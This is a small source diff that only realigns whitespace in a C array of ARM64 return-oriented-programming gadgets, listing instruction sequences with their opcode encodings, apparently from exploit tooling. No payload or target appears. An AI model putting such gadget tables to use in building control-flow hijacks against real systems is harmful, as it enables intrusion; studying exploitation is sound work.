@@ -409,7 +409,7 @@ struct gadget gadgets[] = {
 	GADGET("ldp x8, x1, [x20, #0x10] ; blr x8", 2, 0xa9410688, 0xd63f0100),
 	GADGET("str x0, [x20] ; ldr x8, [x22] ; ldr x8, [x8, #0x28] ; mov x0, x22 ; blr x8",
 	                                            5, 0xf9000280, 0xf94002c8, 0xf9401508,
-	                                                 0xaa1603e0, 0xd63f0100),
+	                                               0xaa1603e0, 0xd63f0100),
 	GADGET("mov x30, x21 ; br x8",              2, 0xaa1503fe, 0xd61f0100),
 	GADGET("ret",                               1, 0xd65f03c0)
 };
